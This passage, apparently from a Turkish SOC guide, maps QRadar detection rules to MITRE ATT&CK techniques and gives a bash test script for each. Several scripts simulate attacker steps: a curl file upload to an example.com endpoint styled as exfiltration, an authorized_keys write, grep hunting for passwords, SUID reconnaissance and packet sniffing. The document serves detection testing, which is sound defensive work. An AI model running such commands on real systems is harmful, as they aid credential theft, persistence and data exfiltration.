echo "[*] Testing DT0538 - SSH authorized_keys manipulation"
echo "ssh-rsa AAAAB3... test@test" > /tmp/authorized_keys.test
rm -f /tmp/authorized_keys.test
```

---

## 54. DT0555 - Suspicious Loadable Kernel Module
**Test Definition Analizi:**
- Modprobe ile kernel modülü yükleme işlemlerini tespit eder
- `modprobe` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1547.006 - Boot or Logon Autostart Execution: Kernel Modules and Extensions
- **Teknik:** T1014 - Rootkit
- **Taktik:** Persistence, Privilege Escalation

**Test Script:**
```bash
#!/bin/bash
# DT0555 Test Script
echo "[*] Testing DT0555 - Kernel module loading with modprobe"
# Güvenli test
modprobe -l 2>/dev/null | head -5 || echo "modprobe -l not supported"
```

---

## 55. DT0537 - Tail the UFW Firewall Log File - T1562
**Test Definition Analizi:**
- UFW log dosyasını takip etmeyi tespit eder
- `tail /var/log/ufw.log` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1070.002 - Indicator Removal: Clear Linux or Mac System Logs
- **Taktik:** Defense Evasion
- **Not:** Log analizi veya silme öncesi keşif olabilir

**Test Script:**
```bash
#!/bin/bash
# DT0537 Test Script
echo "[*] Testing DT0537 - UFW log monitoring"
tail -n 5 /var/log/ufw.log 2>/dev/null || echo "UFW log not accessible"
```

---

## 56. DT0514 - Malicious User Agents - Nix - T1071
**Test Definition Analizi:**
- curl ile özel user-agent kullanımını tespit eder
- `curl -s -A` parametrelerini kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1071.001 - Application Layer Protocol: Web Protocols
- **Taktik:** Command and Control

**Test Script:**
```bash
#!/bin/bash
# DT0514 Test Script
echo "[*] Testing DT0514 - Custom user agent with curl"
curl -s -A "MaliciousBot/1.0" http://example.com -o /dev/null
```

---

## 57. DT0513 - Tor Proxy Usage - Systemctl - T1090
**Test Definition Analizi:**
- Tor servisinin başlatılmasını tespit eder
- `systemctl start tor` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1090.003 - Proxy: Multi-hop Proxy
- **Taktik:** Command and Control

**Test Script:**
```bash
#!/bin/bash
# DT0513 Test Script
echo "[*] Testing DT0513 - Tor service activation"
# Tehlikeli komut - sadece simülasyon
echo "systemctl start tor simülasyonu"
```

---

## 58. DT0515 - Exfiltrate Data HTTPS Using curl Linux - T1048
**Test Definition Analizi:**
- curl -F ile form data göndermeyi ve exfiltration parametrelerini tespit eder
- `curl -F` ile `maxDownloads` ve `autoDelete` parametrelerini kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1048.003 - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
- **Taktik:** Exfiltration

**Test Script:**
```bash
#!/bin/bash
# DT0515 Test Script
echo "[*] Testing DT0515 - Data exfiltration with curl -F"
echo "sensitive data" > /tmp/exfil.txt
curl -F "file=@/tmp/exfil.txt" "https://example.com/upload?maxDownloads=1&autoDelete=true"
rm -f /tmp/exfil.txt
```

---

## 59. DT0500 - System Owner/User Discovery
**Test Definition Analizi:**
- Sistemdeki aktif kullanıcıları keşfetmeyi tespit eder
- `users` veya `who` komutlarını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1033 - System Owner/User Discovery
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0500 Test Script
echo "[*] Testing DT0500 - System user discovery"
users
who
```

---

## 60. DT0520 - Process Discovery - ps - T1057
**Test Definition Analizi:**
- Process listesini görüntülemeyi tespit eder
- `ps` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1057 - Process Discovery
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0520 Test Script
echo "[*] Testing DT0520 - Process discovery"
ps aux | head -10
```

---

## 61. DT0519 - Add or Copy Content to Cipboard with xClip - T1115
**Test Definition Analizi:**
- xclip ile clipboard işlemlerini tespit eder (DT0556 ile benzer)
- `xclip -sel clip` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1115 - Clipboard Data
- **Taktik:** Collection

**Test Script:**
```bash
#!/bin/bash
# DT0519 Test Script
echo "[*] Testing DT0519 - Clipboard data collection"
echo "captured data" | xclip -sel clip 2>/dev/null || echo "xclip not available"
```

---

## 62. DT0522 - Go Compile - T1027
**Test Definition Analizi:**
- Go programlarının derlenmesini tespit eder
- `go run` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1027.004 - Obfuscated Files or Information: Compile After Delivery
- **Taktik:** Defense Evasion

**Test Script:**
```bash
#!/bin/bash
# DT0522 Test Script
echo "[*] Testing DT0522 - Go compilation"
echo 'package main; import "fmt"; func main() { fmt.Println("test") }' > /tmp/test.go
go run /tmp/test.go 2>/dev/null || echo "Go not installed"
rm -f /tmp/test.go
```

---

## 63. DT0521 - Linux Using tshark or tcpdump - T1040
**Test Definition Analizi:**
- Ağ trafiği yakalama araçlarının kullanımını tespit eder
- `tcpdump` veya `tshark` komutlarını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1040 - Network Sniffing
- **Taktik:** Credential Access, Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0521 Test Script
echo "[*] Testing DT0521 - Network sniffing tools"
timeout 2 tcpdump -i lo -c 5 2>/dev/null || echo "tcpdump requires root"
```

---

## 64. DT0524 - Examine Password Complexity Policy - Ubuntu - T1201
**Test Definition Analizi:**
- Ubuntu sistemlerde PAM parola politikasını keşfetmeyi tespit eder
- `/etc/pam.d/common-password` dosyasına erişimi kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1201 - Password Policy Discovery
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0524 Test Script
echo "[*] Testing DT0524 - Ubuntu password policy discovery"
cat /etc/pam.d/common-password 2>/dev/null | grep -i password
```

---

## 65. DT0523 - Sudo Usage - T1548
**Test Definition Analizi:**
- sudo komutunun herhangi bir kullanımını tespit eder
- Sadece `sudo` içeren komutları kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching
- **Taktik:** Privilege Escalation, Defense Evasion

**Test Script:**
```bash
#!/bin/bash
# DT0523 Test Script
echo "[*] Testing DT0523 - Sudo usage"
sudo -l 2>/dev/null || echo "Sudo privileges check"
```

---

## 66. DT0516 - Masquerading as Linux crond process - T1036
**Test Definition Analizi:**
- Not: Test definition yanlış görünüyor, curl -F komutları var (DT0515 ile aynı)
- Muhtemelen crond taklit eden process tespiti olmalı

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1036.004 - Masquerading: Masquerade Task or Service
- **Taktik:** Defense Evasion

**Test Script:**
```bash
#!/bin/bash
# DT0516 Test Script
echo "[*] Testing DT0516 - Process masquerading"
# Test definition hatalı görünüyor
echo "Process masquerading test"
```

---

## 67. DT0517 - Do Reconnaissance for Files that Have the Setuid Bit Set - T1548
**Test Definition Analizi:**
- SUID bit'i olan dosyaları aramayı tespit eder
- `find /usr/bin -perm -4000` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid
- **Taktik:** Privilege Escalation, Defense Evasion

**Test Script:**
```bash
#!/bin/bash
# DT0517 Test Script
echo "[*] Testing DT0517 - SUID bit reconnaissance"
find /usr/bin -perm -4000 2>/dev/null | head -10
```

---

## 68. DT0518 - Extract Passwords with grep - T1552
**Test Definition Analizi:**
- grep ile parola aramayı tespit eder
- `grep -ri password` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1552.001 - Unsecured Credentials: Credentials In Files
- **Taktik:** Credential Access

**Test Script:**
```bash
#!/bin/bash
# DT0518 Test Script
echo "[*] Testing DT0518 - Password extraction with grep"
grep -ri "password" /tmp 2>/dev/null | head -5
```

---

## Genel Test Script'i

Tüm kuralları test eden ana script:

```bash
#!/bin/bash
# QRadar Korelasyon Kuralları Test Script'i
# NOT: Bu script sadece test amaçlıdır. Üretim ortamında dikkatli kullanın!

echo "QRadar Korelasyon Kuralları Test Script'i Başlatılıyor..."
echo "=========================================="
echo ""

# Renk kodları
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Test fonksiyonu
run_test() {
    local rule_id=$1
    local rule_name=$2
    local test_command=$3
    
    echo -e "${YELLOW}[TEST]${NC} $rule_id - $rule_name"
    
    # Test komutunu çalıştır
    eval "$test_command" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[PASS]${NC} Test başarılı"
    else
        echo -e "${RED}[FAIL]${NC} Test başarısız veya yetki yetersiz"
    fi
    echo ""
}

# Testleri çalıştır
echo "Basit testler çalıştırılıyor..."
echo "------------------------------"

# Örnek testler
run_test "DT0500" "System Owner/User Discovery" "who"
run_test "DT0520" "Process Discovery" "ps aux | head -5"
run_test "DT0557" "List OS Information" "uname -a"
run_test "DT0508" "System Service Discovery" "systemctl --type=service --state=running | head -5"
run_test "DT0549" "Linux List Kernel Modules" "lsmod | head -5"

echo ""
echo "Test tamamlandı!"
echo ""
echo "NOT: Bu script sadece gösterim amaçlıdır."
echo "Gerçek ortamda çalıştırmadan önce her komutu kontrol edin!"
```

## Özet ve Öneriler

1. **En Kritik Kurallar:**
   - DT0530, DT0533, DT0566: Privilege escalation tespiti
   - DT0559, DT0548, DT0555: Rootkit/persistence tespiti
   - DT0501-DT0505: Ransomware/encryption tespiti
   - DT0560, DT0515: Data exfiltration tespiti

2. **İyileştirme Önerileri:**
   - Sadece 1 kural aktif durumda, kritik kuralları aktifleştirin
   - DT0516 kuralının test definition'ı kontrol edilmeli
   - Event ID'leri (4750199, 4750126) Linux audit yapılandırmasına bağlı

3. **MITRE Coverage Analizi:**
   - En çok kapsanan taktikler: Discovery, Defense Evasion, Persistence
   - Eksik alanlar: Initial Access, Resource Development, Command and Control (kısmen)

Bu mapping ve test scriptleri, SOC ekibinizin QRadar kurallarını daha iyi anlamasına ve test etmesine yardımcı olacaktır.